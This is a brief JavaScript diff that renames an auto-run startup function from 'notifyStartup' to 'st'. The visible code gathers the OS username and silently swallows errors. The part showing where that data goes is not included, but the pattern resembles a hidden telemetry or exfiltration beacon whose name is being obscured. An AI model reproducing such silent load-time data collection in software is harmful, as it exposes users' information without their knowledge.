@@ -1,5 +1,5 @@
 const os = require("os");
-async function notifyStartup() {
+async function st() {
   try {
     const In = {
       username: os.userInfo().username,
@@ -26,4 +26,4 @@ async function notifyStartup() {
   } catch (error) {}
 }
 
-notifyStartup();
+st();
